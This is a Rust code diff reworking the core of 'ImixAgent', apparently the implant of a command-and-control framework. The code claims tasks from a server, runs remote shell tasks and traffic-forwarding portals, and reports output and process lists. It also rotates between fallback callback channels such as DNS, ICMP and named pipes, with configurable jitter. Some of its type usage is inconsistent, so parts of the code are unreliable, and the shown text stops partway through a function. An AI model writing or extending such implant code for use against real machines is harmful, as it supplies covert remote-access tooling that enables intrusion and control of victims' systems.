@@ -19,7 +19,7 @@ use crate::portal::run_create_portal;
 use crate::shell::manager::{ShellManager, ShellManagerMessage};
 use crate::task::TaskRegistry;
 
-const MAX_BUF_OUTPUT_MESSAGES: usize = 100;
+const MAX_BUF_OUTPUT_MESSAGES: usize = 65535;
 
 pub type PendingForward = (
     String,
@@ -80,206 +80,255 @@ impl ImixAgent {
         let info = cfg
             .info
             .as_ref()
-            .context("Configuration has no agent information")?;
-        let interval = info
-            .callback_interval
+            .ok_or_else(|| anyhow::anyhow!("No beacon info in config"))?;
+
+        let available_transports = info
+            .available_transports
             .as_ref()
-            .context("Configuration has no callback interval")?;
-        Ok(interval.seconds as u64)
+            .ok_or_else(|| anyhow::anyhow!("no available transports set"))?;
+
+        let active_idx = available_transports.active_index as usize;
+        let interval = available_transports
+            .transports
+            .get(active_idx)
+            .or_else(|| available_transports.transports.first())
+            .ok_or_else(|| anyhow::anyhow!("no transports configured"))?
+            .interval;
+
+        Ok(interval)
     }
 
-    pub fn get_callback_interval(&self) -> Result<Duration> {
-        let seconds = self.get_callback_interval_u64()?;
-        Ok(Duration::from_secs(seconds))
-    }
-
-    pub fn get_tasks_to_execute(&self) -> Result<Vec<c2::Task>> {
-        let mut tasks = Vec::new();
-        while let Some(task) = self.task_registry.get_next_queued_task() {
-            tasks.push(task);
-        }
-        Ok(tasks)
-    }
-
-    pub fn cancel_task(&self, task_id: i64) -> Result<()> {
-        self.task_registry.cancel_task(task_id);
-
-        if let Ok(mut subtasks) = self.subtasks.lock() {
-            if let Some(handle) = subtasks.remove(&task_id) {
-                handle.abort();
-            }
-        }
-
-        Ok(())
-    }
-
-    pub fn cancel_all_tasks(&self) -> Result<()> {
-        self.task_registry.cancel_all_tasks();
-
-        if let Ok(mut subtasks) = self.subtasks.lock() {
-            for (_task_id, handle) in subtasks.drain() {
-                handle.abort();
-            }
-        }
-
-        Ok(())
-    }
-
-    pub async fn update_config(&self, new_config: Config) -> Result<()> {
-        let mut cfg = self.config.write().await;
-        *cfg = new_config;
-        Ok(())
-    }
-
-    pub async fn update_transport(&self, new_transport: Box<dyn Transport + Send + Sync>) {
-        let mut transport = self.transport.write().await;
-        *transport = new_transport;
-    }
-
-    pub async fn claim_tasks(&self) -> Result<Option<c2::ClaimTasksResponse>> {
-        let mut transport = self.get_usable_transport().await?;
-        let req = self.build_claim_tasks_request().await?;
-        let resp = transport.claim_tasks(req).await?;
-        Ok(Some(resp))
-    }
-
-    pub async fn report_output(&self, msg: ReportOutputRequest) -> Result<()> {
-        let mut transport = self.get_usable_transport().await?;
-        transport.report_output(msg).await?;
-        Ok(())
-    }
-
-    pub async fn build_claim_tasks_request(&self) -> Result<ClaimTasksRequest> {
-        let cfg = self.config.read().await;
+    pub fn get_callback_jitter(&self) -> Result<f32> {
+        // Blocks on read, but it's fast
+        let cfg = self
+            .config
+            .try_read()
+            .map_err(|_| anyhow::anyhow!("Failed to acquire read lock on config"))?;
         let info = cfg
             .info
             .as_ref()
-            .context("Configuration has no agent information")?;
+            .ok_or_else(|| anyhow::anyhow!("No beacon info in config"))?;
 
-        let hostname = match hostname::get() {
-            Ok(name) => name.to_string_lossy().into_owned(),
-            Err(_) => "".to_string(),
-        };
+        let available_transports = info
+            .available_transports
+            .as_ref()
+            .ok_or_else(|| anyhow::anyhow!("no available transports set"))?;
 
-        let agent_identity = pb::c2::Agent {
-            id: info.agent_id.clone(),
-            host: Some(pb::c2::Host {
-                id: info.host_id.clone(),
-                platform: Platform::from(cfg.target_os).into(),
-                name: hostname,
-            }),
-            name: info.name.clone(),
-            registered_at: None,
-        };
+        let active_idx = available_transports.active_index as usize;
+        let jitter = available_transports
+            .transports
+            .get(active_idx)
+            .or_else(|| available_transports.transports.first())
+            .ok_or_else(|| anyhow::anyhow!("no transports configured"))?
+            .jitter;
 
-        let tasks: Vec<c2::TaskContext> = self
-            .task_registry
-            .tasks
-            .lock()
-            .unwrap()
-            .iter()
-            .map(|(id, t)| c2::TaskContext {
-                task_id: *id,
-                status: t.status.into(),
-            })
-            .collect();
-
-        let req = c2::ClaimTasksRequest {
-            agent: Some(agent_identity),
-            tasks,
-        };
-
-        Ok(req)
+        Ok(jitter)
     }
 
-    pub async fn forward_raw(
-        &self,
-        path: String,
-        rx: tokio::sync::mpsc::Receiver<Vec<u8>>,
-        tx: tokio::sync::mpsc::Sender<Vec<u8>>,
-    ) -> Result<()> {
-        let mut transport = self.get_usable_transport().await?;
-        transport.forward_raw(path, rx, tx).await?;
-        Ok(())
+    // Triggers config.refresh_primary_ip() in a write lock
+    pub async fn refresh_ip(&self) {
+        let mut cfg = self.config.write().await;
+        cfg.refresh_primary_ip();
     }
 
-    pub async fn get_usable_transport(&self) -> Result<Box<dyn Transport + Send + Sync>> {
-        let transport = self.transport.read().await;
-        transport.get_usable_transport().await
+    // Updates the shared transport with a new instance
+    pub async fn update_transport(&self, t: Box<dyn Transport + Send + Sync>) {
+        let mut transport = self.transport.write().await;
+        *transport = t;
     }
 
-    pub async fn drain_report_output_requests(
-        &self,
-    ) -> Result<BTreeMap<TaskContext, Vec<TaskOutput>>> {
-        let mut reqs = BTreeMap::new();
-        let rx = self.output_rx.lock().unwrap();
-
-        while let Ok(req) = rx.try_recv() {
-            let msg = match req.message {
-                Some(report_output_request::Message::TaskOutput(msg)) => msg,
-                Some(report_output_request::Message::ShellTaskOutput(msg)) => {
-                    self.shell_manager_tx
-                        .send(ShellManagerMessage::Output(msg))
-                        .await?;
-                    continue;
-                }
-                None => continue,
-            };
-
-            let ctx = match msg.context {
-                Some(ctx) => ctx,
-                None => continue,
-            };
-
-            let output = match msg.output {
-                Some(output) => output,
-                None => continue,
-            };
-
-            reqs.entry(ctx).or_insert_with(Vec::new).push(output);
+    // Flushes all buffered task outputs and process list reports using the provided transport
+    pub async fn flush_outputs(&self) {
+        let mut outputs = Vec::new();
+        if let Ok(rx) = self.output_rx.lock() {
+            while let Ok(msg) = rx.recv_timeout(Duration::from_millis(10)) {
+                outputs.push(msg);
+            }
         }
 
-        Ok(reqs)
-    }
-
-    pub async fn drain_process_list_requests(&self) -> Result<Vec<c2::ReportProcessListRequest>> {
-        let mut reqs = Vec::new();
-        let rx = self.process_list_rx.lock().unwrap();
-
-        while let Ok(req) = rx.try_recv() {
-            reqs.push(req);
+        let mut process_list_reqs = Vec::new();
+        if let Ok(rx) = self.process_list_rx.lock() {
+            while let Ok(msg) = rx.recv_timeout(Duration::from_millis(10)) {
+                process_list_reqs.push(msg);
+            }
         }
 
-        Ok(reqs)
-    }
+        #[cfg(feature = "print_debug")]
+        log::info!(
+            "Flushing {} task outputs and {} process list reports",
+            outputs.len(),
+            process_list_reqs.len()
+        );
 
-    pub async fn process_job_response(&self, resp: c2::ClaimTasksResponse) -> Result<()> {
-        let agent: Arc<dyn Agent> = Arc::new(self.clone());
-        for task in resp.tasks {
-            match task.task {
-                Some(c2::task::Task::Eldritch(tome)) => {
-                    self.task_registry.spawn(tome, agent.clone());
-                }
-                Some(c2::task::Task::Portal(portal)) => {
-                    let agent = self.clone();
-                    self.runtime_handle
-                        .spawn(async move { run_create_portal(agent, portal).await });
-                }
-                None => {
-                    #[cfg(feature = "print_debug")]
-                    log::error!("Received unknown task type from server");
+        if outputs.is_empty() && process_list_reqs.is_empty() {
+            return;
+        }
+
+        let mut merged_task_outputs: BTreeMap<i64, (TaskContext, TaskOutput)> = BTreeMap::new();
+        let mut merged_shell_outputs: BTreeMap<i64, (ShellTaskContext, ShellTaskOutput)> =
+            BTreeMap::new();
+
+        for output in outputs {
+            if let Some(msg) = output.message {
+                match msg {
+                    report_output_request::Message::TaskOutput(m) => {
+                        if let (Some(ctx), Some(new_out)) = (m.context, m.output) {
+                            let task_id = ctx.task_id;
+                            use std::collections::btree_map::Entry;
+                            match merged_task_outputs.entry(task_id) {
+                                Entry::Occupied(mut entry) => {
+                                    let (_, existing_out) = entry.get_mut();
+                                    existing_out.output.push_str(&new_out.output);
+                                    match (&mut existing_out.error, &new_out.error) {
+                                        (Some(e1), Some(e2)) => e1.msg.push_str(&e2.msg),
+                                        (None, Some(e2)) => existing_out.error = Some(e2.clone()),
+                                        _ => {}
+                                    }
+                                    if new_out.exec_finished_at.is_some() {
+                                        existing_out.exec_finished_at =
+                                            new_out.exec_finished_at.clone();
+                                    }
+                                }
+                                Entry::Vacant(entry) => {
+                                    entry.insert((ctx, new_out));
+                                }
+                            }
+                        }
+                    }
+                    report_output_request::Message::ShellTaskOutput(m) => {
+                        if let (Some(ctx), Some(new_shell_out)) = (m.context, m.output) {
+                            let shell_task_id = ctx.shell_task_id;
+                            use std::collections::btree_map::Entry;
+                            match merged_shell_outputs.entry(shell_task_id) {
+                                Entry::Occupied(mut entry) => {
+                                    let (_, existing_out) = entry.get_mut();
+                                    existing_out.output.push_str(&new_shell_out.output);
+                                    match (&mut existing_out.error, &new_shell_out.error) {
+                                        (Some(e1), Some(e2)) => e1.msg.push_str(&e2.msg),
+                                        (None, Some(e2)) => existing_out.error = Some(e2.clone()),
+                                        _ => {}
+                                    }
+                                    if new_shell_out.exec_finished_at.is_some() {
+                                        existing_out.exec_finished_at =
+                                            new_shell_out.exec_finished_at.clone();
+                                    }
+                                }
+                                Entry::Vacant(entry) => {
+                                    entry.insert((ctx, new_shell_out));
+                                }
+                            }
+                        }
+                    }
                 }
             }
         }
 
-        for task_id in resp.cancel_tasks {
-            if let Err(_e) = self.cancel_task(task_id) {
+        let mut transport_guard = self.transport.write().await;
+        let transport = &mut *transport_guard;
+        if !transport.is_active() {
+            return;
+        }
+
+        for (_, (ctx, output)) in merged_task_outputs {
+            #[cfg(feature = "print_debug")]
+            log::info!("Task Output: {output:#?}");
+
+            let req = ReportOutputRequest {
+                message: Some(report_output_request::Message::TaskOutput(
+                    ReportTaskOutputMessage {
+                        context: Some(ctx),
+                        output: Some(output),
+                    },
+                )),
+            };
+
+            if let Err(_e) = transport.report_output(req).await {
                 #[cfg(feature = "print_debug")]
-                log::error!("Failed to cancel task {}: {_e:#}", task_id);
+                log::error!("Failed to report task output: {_e}");
             }
         }
 
-        Ok(())
+        for (_, (ctx, output)) in merged_shell_outputs {
+            #[cfg(feature = "print_debug")]
+            log::info!("Shell Task Output: {output:#?}");
+
+            let req = ReportOutputRequest {
+                message: Some(report_output_request::Message::ShellTaskOutput(
+                    ReportShellTaskOutputMessage {
+                        context: Some(ctx),
+                        output: Some(output),
+                    },
+                )),
+            };
+
+            if let Err(_e) = transport.report_output(req).await {
+                #[cfg(feature = "print_debug")]
+                log::error!("Failed to report shell task output: {_e}");
+            }
+        }
+
+        // Only send the latest process list report (it replaces previous ones)
+        if let Some(req) = process_list_reqs.into_iter().last()
+            && let Err(_e) = transport.report_process_list(req).await
+        {
+            #[cfg(feature = "print_debug")]
+            log::error!("Failed to report process list: {_e}");
+        }
+    }
+
+    // Helper to get config URIs for creating new transport
+    pub async fn get_transport_config(&self) -> Config {
+        self.config.read().await.clone()
+    }
+
+    pub async fn rotate_callback_uri(&self) {
+        let mut cfg = self.config.write().await;
+        if let Some(info) = cfg.info.as_mut()
+            && let Some(available_transports) = info.available_transports.as_mut()
+        {
+            let num_transports = available_transports.transports.len();
+            if num_transports > 0 {
+                let current_idx = available_transports.active_index as usize;
+                available_transports.active_index = ((current_idx + 1) % num_transports) as u32;
+            }
+        }
+    }
+
+    // Helper to get a usable transport.
+    // If the shared transport is active, returns a clone of it.
+    // If not, creates a new one from config.
+    async fn get_usable_transport(&self) -> Result<Box<dyn Transport + Send + Sync>> {
+        // 1. Check shared transport
+        {
+            let guard = self.transport.read().await;
+            if guard.is_active() {
+                return Ok(guard.clone_box());
+            }
+        }
+        // 2. Create new transport from config
+        let config = self.get_transport_config().await;
+        let t =
+            transport::create_transport(config).context("Failed to create on-demand transport")?;
+
+        #[cfg(feature = "print_debug")]
+        log::debug!("Created on-demand transport for background task");
+
+        Ok(t)
+    }
+
+    // Helper to claim tasks and return them, so main can spawn
+    pub async fn claim_tasks(&self) -> Result<c2::ClaimTasksResponse> {
+        let mut transport_guard = self.transport.write().await;
+        let transport = &mut *transport_guard;
+        let beacon_info = self.config.read().await.info.clone();
+        let req = ClaimTasksRequest {
+            beacon: beacon_info,
+        };
+        let response = transport
+            .claim_tasks(req)
+            .await
+            .context("Failed to claim tasks")?;
+        Ok(response)
     }
 
     pub async fn process_job_request(&self) -> Result<()> {
@@ -308,98 +357,34 @@ impl ImixAgent {
             });
         }
 
-        // Drain any output and report it
-        let reqs = self.drain_report_output_requests().await?;
-        let process_list_reqs = self.drain_process_list_requests().await?;
+        let resp = self.claim_tasks().await?;
 
-        let mut transport = self.get_usable_transport().await?;
+        let mut has_work = false;
 
-        for (ctx, output) in reqs {
-            let msg = c2::ReportTaskOutputMessage {
-                context: Some(ctx),
-                output,
-            };
-
-            let req = c2::ReportOutputRequest {
-                message: Some(report_output_request::Message::TaskOutput(msg)),
-            };
-
-            if let Err(_e) = transport.report_output(req).await {
+        if !resp.tasks.is_empty() {
+            has_work = true;
+            let registry = self.task_registry.clone();
+            let agent = Arc::new(self.clone());
+            for task in resp.tasks {
                 #[cfg(feature = "print_debug")]
-                log::error!("Failed to report output: {_e:#}");
+                log::info!("Claimed task {}: JWT={}", task.id, task.jwt);
+
+                registry.spawn(task, agent.clone());
             }
         }
 
-        // Only report the latest process list
-        if let Some(req) = process_list_reqs.into_iter().last()
-            && let Err(_e) = transport.report_process_list(req).await
-        {
-            #[cfg(feature = "print_debug")]
-            log::error!("Failed to report process list: {_e:#}");
-        }
-
-        // Try and claim tasks
-        let req = self.build_claim_tasks_request().await?;
-        let resp = transport.claim_tasks(req).await?;
-
-        // Handle beacon-provided config update:
-        // Update the transport fallback pool based on available transports from server
-        let mut cfg = self.config.write().await;
-        if let Some(info) = cfg.info.as_mut()
-            && let Some(available_transports) = info.available_transports.as_mut()
-        {
-            // Collect the set of URIs present in the server's update
-            let server_uris: BTreeSet<String> = resp
-                .transports
-                .iter()
-                .map(|t| t.callback_uri.clone())
-                .collect();
-
-            // Retain only those transports whose URI is still in the server's update
-            available_transports
-                .transports
-                .retain(|t| server_uris.contains(&t.uri));
-
-            // Upsert each transport from the server
-            for server_t in resp.transports {
-                let transport_type = match server_t.r#type() {
-                    pb::c2::transport::Type::Grpc => pb::config::transport::Type::Grpc,
-                    pb::c2::transport::Type::Http1 => pb::config::transport::Type::Http1,
-                    pb::c2::transport::Type::Http2 => pb::config::transport::Type::Http2,
-                    pb::c2::transport::Type::Dns => pb::config::transport::Type::Dns,
-                    pb::c2::transport::Type::Quic => pb::config::transport::Type::Quic,
-                    pb::c2::transport::Type::Icmp => pb::config::transport::Type::Icmp,
-                    pb::c2::transport::Type::TcpBind => pb::config::transport::Type::TcpBind,
-                    pb::c2::transport::Type::NamedPipeBind => {
-                        pb::config::transport::Type::NamedPipeBind
-                    }
-                };
-
-                let new_transport = pb::config::Transport {
-                    uri: server_t.callback_uri.clone(),
-                    interval: server_t.callback_interval.unwrap_or_default().seconds as u64,
-                    r#type: transport_type as i32,
-                    extra: server_t.extra.clone(),
-                };
-
-                if let Some(existing) = available_transports
-                    .transports
-                    .iter_mut()
-                    .find(|t| t.uri == server_t.callback_uri)
-                {
-                    *existing = new_transport;
-                } else {
-                    available_transports.transports.push(new_transport);
-                }
+        if !resp.shell_tasks.is_empty() {
+            has_work = true;
+            for shell_task in resp.shell_tasks {
+                let _ = self
+                    .shell_manager_tx
+                    .try_send(ShellManagerMessage::ProcessTask(shell_task));
             }
-
-            // Sync the updated transports with the active transport pool
-            let mut active_transport = self.transport.write().await;
-            active_transport.sync_transports(available_transports.clone())?;
         }
 
-        // Process any returned tasks
-        self.process_job_response(resp).await?;
+        if !has_work {
+            return Ok(());
+        }
 
         Ok(())
     }
@@ -493,51 +478,36 @@ impl Agent for ImixAgent {
         &self,
         req: c2::ReportProcessListRequest,
     ) -> Result<c2::ReportProcessListResponse, String> {
-        // Convert to an async channel and pass through to agent's report_process_list
-        let _ = self.process_list_tx.send(req);
-
+        // Buffer the request to be sent during the next flush cycle
+        self.process_list_tx
+            .try_send(req)
+            .map_err(|_| "Process list buffer full".to_string())?;
         Ok(c2::ReportProcessListResponse {})
     }
 
-    fn report_task_output(
+    fn report_output(
         &self,
-        req: std::sync::mpsc::Receiver<c2::ReportTaskOutputMessage>,
+        req: c2::ReportOutputRequest,
     ) -> Result<c2::ReportOutputResponse, String> {
-        // Collect messages from the sync channel and queue them in output_tx.
-        // The beacon loop drains output_tx, batches by TaskContext, and sends them.
-        while let Ok(msg) = req.recv() {
-            let req = c2::ReportOutputRequest {
-                message: Some(report_output_request::Message::TaskOutput(msg)),
-            };
-
-            let _ = self.output_tx.send(req);
-        }
-
+        // Buffer output instead of sending immediately
+        self.output_tx
+            .try_send(req)
+            .map_err(|_| "Output buffer full".to_string())?;
         Ok(c2::ReportOutputResponse {})
     }
 
-    fn report_shell_task_output(
-        &self,
-        req: std::sync::mpsc::Receiver<c2::ReportShellTaskOutputMessage>,
-    ) -> Result<c2::ReportOutputResponse, String> {
-        while let Ok(msg) = req.recv() {
-            let req = c2::ReportOutputRequest {
-                message: Some(report_output_request::Message::ShellTaskOutput(msg)),
-            };
-
-            let _ = self.output_tx.send(req);
-        }
-
-        Ok(c2::ReportOutputResponse {})
-    }
-
-    fn spawn_shell(&self, id: i64) -> Result<(), String> {
+    fn create_portal(&self, context: Context) -> Result<(), String> {
+        let shell_manager_tx = self.shell_manager_tx.clone();
+        let id = match &context {
+            Context::Task(tc) => tc.task_id,
+            Context::ShellTask(stc) => stc.shell_task_id,
+        };
         self.spawn_subtask(id, move |transport| async move {
-            crate::shell::run_shell(id, transport).await
+            run_create_portal(context, transport, shell_manager_tx).await
         })
     }
 
-    fn claim_tasks(&self, req: ClaimTasksRequest) -> Result<c2::ClaimTasksResponse, String> {
+    fn claim_tasks(&self, req: c2::ClaimTasksRequest) -> Result<c2::ClaimTasksResponse, String> {
         self.with_transport(|mut t| async move { t.claim_tasks(req).await })
     }
 
@@ -547,189 +517,204 @@ impl Agent for ImixAgent {
         rx: tokio::sync::mpsc::Receiver<Vec<u8>>,
         tx: tokio::sync::mpsc::Sender<Vec<u8>>,
     ) -> Result<(), String> {
-        let mut pending = self.pending_forwards.lock().await;
-        pending.push((path, rx, tx));
+        let mut forwards = self.pending_forwards.lock().await;
+        forwards.push((path, rx, tx));
         Ok(())
     }
 
-    fn get_config(&self) -> Result<Config, String> {
-        self.runtime_handle
+    fn get_config(&self) -> Result<BTreeMap<String, String>, String> {
+        let mut map = BTreeMap::new();
+        // Blocks on read, but it's fast
+        let cfg = self
             .block_on(async { Ok(self.config.read().await.clone()) })
-    }
+            .map_err(|e: String| e)?;
 
-    fn get_agent_name(&self) -> Result<String, String> {
-        let cfg = self.get_config()?;
-        let info = cfg
+        let active_uri = self.get_active_callback_uri().unwrap_or_default();
+        let config = cfg.clone();
+
+        let available_transports = config
             .info
             .as_ref()
-            .ok_or_else(|| "Configuration has no agent information".to_string())?;
-        Ok(info.name.clone())
+            .and_then(|info| info.available_transports.as_ref())
+            .context("failed to get available transports")
+            .map_err(|e| e.to_string())?;
+
+        let active_idx = available_transports.active_index as usize;
+        let active_transport = available_transports
+            .transports
+            .get(active_idx)
+            .or_else(|| available_transports.transports.first())
+            .context("no transports configured")
+            .map_err(|e| e.to_string())?;
+
+        map.insert("callback_uri".to_string(), active_uri);
+        map.insert(
+            "retry_interval".to_string(),
+            active_transport.interval.to_string(),
+        );
+        map.insert("run_once".to_string(), cfg.run_once.to_string());
+
+        if let Some(info) = &cfg.info {
+            map.insert("beacon_id".to_string(), info.identifier.clone());
+            map.insert("principal".to_string(), info.principal.clone());
+            map.insert(
+                "interval".to_string(),
+                active_transport.interval.to_string(),
+            );
+            if let Some(host) = &info.host {
+                map.insert("hostname".to_string(), host.name.clone());
+                map.insert(
+                    "platform".to_string(),
+                    Platform::try_from(host.platform)
+                        .unwrap_or_default()
+                        .as_str_name()
+                        .into(),
+                );
+                map.insert("primary_ip".to_string(), host.primary_ip.clone());
+            }
+            if let Some(available_transports) = &info.available_transports {
+                let idx = available_transports.active_index;
+                let active_transport = &available_transports.transports[idx as usize];
+                map.insert("uri".to_string(), active_transport.uri.clone());
+                map.insert(
+                    "type".to_string(),
+                    Type::try_from(active_transport.r#type)
+                        .unwrap_or_default()
+                        .as_str_name()
+                        .into(),
+                );
+                map.insert(
+                    "extra".to_string(),
+                    active_transport.extra.clone().to_string(),
+                );
+            }
+        }
+        Ok(map)
     }
 
-    fn get_host_id(&self) -> Result<String, String> {
-        let cfg = self.get_config()?;
-        let info = cfg
-            .info
-            .as_ref()
-            .ok_or_else(|| "Configuration has no agent information".to_string())?;
-        Ok(info.host_id.clone())
-    }
-
-    fn get_agent_id(&self) -> Result<String, String> {
-        let cfg = self.get_config()?;
-        let info = cfg
-            .info
-            .as_ref()
-            .ok_or_else(|| "Configuration has no agent information".to_string())?;
-        Ok(info.agent_id.clone())
-    }
-
-    fn get_callback_interval(&self) -> Result<u64, String> {
-        self.get_callback_interval_u64()
-            .map_err(|e| format!("Failed to get callback interval: {}", e))
-    }
-
-    fn get_target_os(&self) -> Result<Platform, String> {
-        let cfg = self.get_config()?;
-        Ok(Platform::from(cfg.target_os))
-    }
-
-    fn get_current_transport(&self) -> Result<String, String> {
+    fn get_transport(&self) -> Result<String, String> {
+        // Blocks on read, but it's fast
         self.block_on(async {
             let t = self
                 .get_usable_transport()
                 .await
-                .map_err(|e| format!("Failed to get usable transport: {}", e))?;
-            t.get_current_transport()
-                .await
-                .map_err(|e| format!("Failed to get current transport: {}", e))
+                .map_err(|e| e.to_string())?;
+            Ok(t.name().to_string())
         })
     }
 
-    fn set_callback_interval(&self, seconds: u64) -> Result<(), String> {
-        self.block_on(async {
-            let mut cfg = self.config.write().await;
-            let info = cfg
-                .info
-                .as_mut()
-                .ok_or_else(|| "Configuration has no agent information".to_string())?;
-            info.callback_interval = Some(pb::google::protobuf::Duration {
-                seconds: seconds as i64,
-                nanos: 0,
-            });
-            Ok(())
-        })
-    }
-
-    fn set_jitter(&self, jitter: f64) -> Result<(), String> {
-        if !(0.0..=1.0).contains(&jitter) {
-            return Err("Jitter must be between 0.0 and 1.0".to_string());
+    // TODO: This should probably be removed as schema and transport should be directly tied to one another.
+    fn set_transport(&self, transport: String) -> Result<(), String> {
+        let available = self.list_transports()?;
+        if !available.contains(&transport) {
+            return Err(format!("Invalid transport: {}", transport));
         }
 
         self.block_on(async {
             let mut cfg = self.config.write().await;
-            let info = cfg
-                .info
-                .as_mut()
-                .ok_or_else(|| "Configuration has no agent information".to_string())?;
-            info.jitter = jitter;
+            if let Some(info) = cfg.info.as_mut()
+                && let Some(available_transports) = info.available_transports.as_mut()
+            {
+                let active_idx = available_transports.active_index as usize;
+                if let Some(current_transport) = available_transports.transports.get(active_idx) {
+                    let current_uri = &current_transport.uri;
+                    // Create new URI with the new transport scheme
+                    // TODO: We probably don't need to decouple schema and uri
+                    let new_uri = if let Some(pos) = current_uri.find("://") {
+                        format!("{}://{}", transport, &current_uri[pos + 3..])
+                    } else {
+                        format!("{}://{}", transport, current_uri)
+                    };
+
+                    // Create a new transport with the new URI
+                    let new_transport = pb::c2::Transport {
+                        uri: new_uri,
+                        interval: current_transport.interval,
+                        r#type: current_transport.r#type,
+                        extra: current_transport.extra.clone(),
+                        jitter: current_transport.jitter,
+                    };
+
+                    // Append the new transport and update active_index
+                    available_transports.transports.push(new_transport);
+                    available_transports.active_index =
+                        (available_transports.transports.len() - 1) as u32;
+                }
+            }
             Ok(())
         })
     }
 
-    fn list_available_transports(&self) -> Result<Vec<String>, String> {
+    fn reset_transport(&self) -> Result<(), String> {
+        self.block_on(async {
+            let mut cfg = self.config.write().await;
+            if let Some(info) = cfg.info.as_mut()
+                && let Some(available_transports) = info.available_transports.as_mut()
+            {
+                available_transports.active_index = 0;
+            }
+            Ok(())
+        })
+    }
+
+    fn list_transports(&self) -> Result<Vec<String>, String> {
         self.block_on(async { Ok(self.transport.read().await.list_available()) })
     }
 
-    fn set_transport_priority(&self, uris: Vec<String>) -> Result<(), String> {
-        // First validate that all provided URIs exist in available transports
-        let available_transports = self.list_available_transports()?;
-        for uri in &uris {
-            if !available_transports.contains(uri) {
-                return Err(format!("Transport URI '{}' is not available", uri));
-            }
-        }
+    fn get_callback_interval(&self) -> Result<u64, String> {
+        self.get_callback_interval_u64().map_err(|e| e.to_string())
+    }
 
+    fn set_callback_interval(&self, interval: u64) -> Result<(), String> {
         self.block_on(async {
-            // Update config if it exists
             {
                 let mut cfg = self.config.write().await;
                 if let Some(info) = &mut cfg.info
                     && let Some(available_transports) = &mut info.available_transports
                 {
-                    // Reorder transports based on the provided URI list
-                    let mut reordered = Vec::new();
-                    for uri in &uris {
-                        if let Some(transport) = available_transports
-                            .transports
-                            .iter()
-                            .find(|t| &t.uri == uri)
-                        {
-                            reordered.push(transport.clone());
-                        }
+                    let active_idx = available_transports.active_index as usize;
+                    if let Some(transport) = available_transports.transports.get_mut(active_idx) {
+                        transport.interval = interval;
                     }
-                    available_transports.transports = reordered;
                 }
             }
-
-            // Update active transport pool priority
-            let mut active_transport = self.transport.write().await;
-            active_transport.set_priority(&uris)?;
+            // We force a check-in to update the server with the new interval
+            let _ = self.process_job_request().await;
             Ok(())
         })
     }
 
-    fn add_callback_uri(&self, uri: String) -> Result<(), String> {
+    fn set_callback_uri(&self, uri: String) -> Result<(), String> {
         self.block_on(async {
-            // Parse the new URI to handle DSN format with fallback transport types
+            // Parse the new URI to handle DSN format with query parameters
             let parsed_transport = pb::config::parse_dsn(&uri)
                 .map_err(|e| format!("Failed to parse callback URI: {}", e))?;
 
-            // Update configuration
             let mut cfg = self.config.write().await;
             if let Some(info) = cfg.info.as_mut()
                 && let Some(available_transports) = info.available_transports.as_mut()
             {
-                // Check if transport already exists
-                if !available_transports
-                    .transports
-                    .iter()
-                    .any(|t| t.uri == uri)
-                {
+                // Note: We compare against parsed_transport.uri because parse_dsn strips the query string
+                if let Some(pos) = available_transports.transports.iter().position(|t| {
+                    t.uri == parsed_transport.uri && t.r#type == parsed_transport.r#type
+                }) {
+                    // Set active_index to existing transport
+                    available_transports.active_index = pos as u32;
+
+                    // We also want to update the settings if they were provided in the DSN
+                    // Let's replace the existing transport with the newly parsed one
+                    available_transports.transports[pos] = parsed_transport;
+                } else {
                     available_transports.transports.push(parsed_transport);
+                    available_transports.active_index =
+                        (available_transports.transports.len() - 1) as u32;
                 }
             }
-
-            // Add to active transport pool using sync_transports to ensure proper fallback configuration
-            if let Some(info) = cfg.info.as_ref()
-                && let Some(available_transports) = info.available_transports.as_ref()
-            {
-                let mut active_transport = self.transport.write().await;
-                active_transport.sync_transports(available_transports.clone())?;
-            }
-
             Ok(())
         })
     }
 
-    fn get_callback_uris(&self) -> Result<Vec<String>, String> {
-        self.block_on(async {
-            let cfg = self.config.read().await;
-            if let Some(info) = cfg.info.as_ref()
-                && let Some(available_transports) = info.available_transports.as_ref()
-            {
-                Ok(available_transports
-                    .transports
-                    .iter()
-                    .map(|t| t.uri.clone())
-                    .collect())
-            } else {
-                Ok(Vec::new())
-            }
-        })
-    }
-
-    fn get_active_callback_uri(&self) -> Result<String, String> {
+    fn list_callback_uris(&self) -> Result<BTreeSet<String>, String> {
         self.block_on(async {
             let cfg = self.config.read().await;
             let uris: BTreeSet<String> = cfg
@@ -740,40 +725,75 @@ impl Agent for ImixAgent {
                 .unwrap_or_default();
             Ok(uris)
         })
-        .and_then(|uris| {
-            uris.into_iter()
-                .next()
-                .ok_or_else(|| "No active callback URI".to_string())
+    }
+
+    fn get_active_callback_uri(&self) -> Result<String, String> {
+        self.block_on(async {
+            let cfg = self.config.read().await;
+            cfg.info
+                .as_ref()
+                .and_then(|info| info.available_transports.as_ref())
+                .and_then(|at| {
+                    let active_idx = at.active_index as usize;
+                    at.transports
+                        .get(active_idx)
+                        .or_else(|| at.transports.first())
+                })
+                .map(|t| t.uri.clone())
+                .ok_or_else(|| "No callback URIs configured".to_string())
         })
     }
 
     fn get_next_callback_uri(&self) -> Result<String, String> {
         self.block_on(async {
             let cfg = self.config.read().await;
-            let uris: Vec<String> = cfg
-                .info
+            cfg.info
                 .as_ref()
                 .and_then(|info| info.available_transports.as_ref())
-                .map(|at| at.transports.iter().map(|t| t.uri.clone()).collect())
-                .unwrap_or_default();
-            uris.into_iter()
-                .nth(1)
-                .ok_or_else(|| "No next callback URI".to_string())
+                .and_then(|at| {
+                    if at.transports.is_empty() {
+                        return None;
+                    }
+                    let current_idx = at.active_index as usize;
+                    let next_idx = (current_idx + 1) % at.transports.len();
+                    at.transports.get(next_idx)
+                })
+                .map(|t| t.uri.clone())
+                .ok_or_else(|| "No callback URIs configured".to_string())
         })
     }
 
-    fn set_jitter(&self, jitter: f64) -> Result<(), String> {
-        if !(0.0..=1.0).contains(&jitter) {
-            return Err("Jitter must be between 0.0 and 1.0".to_string());
-        }
-
+    fn add_callback_uri(&self, uri: String) -> Result<(), String> {
         self.block_on(async {
             let mut cfg = self.config.write().await;
-            let info = cfg
-                .info
-                .as_mut()
-                .ok_or_else(|| "Configuration has no agent information".to_string())?;
-            info.jitter = jitter;
+            if let Some(info) = cfg.info.as_mut()
+                && let Some(available_transports) = info.available_transports.as_mut()
+            {
+                // Check if URI already exists
+                if !available_transports.transports.iter().any(|t| t.uri == uri) {
+                    // Get current transport as template
+                    let template = available_transports
+                        .transports
+                        .first()
+                        .cloned()
+                        .unwrap_or_else(|| pb::c2::Transport {
+                            uri: uri.clone(),
+                            interval: 5,
+                            r#type: 0,
+                            extra: String::new(),
+                            jitter: 0.0,
+                        });
+
+                    let new_transport = pb::c2::Transport {
+                        uri,
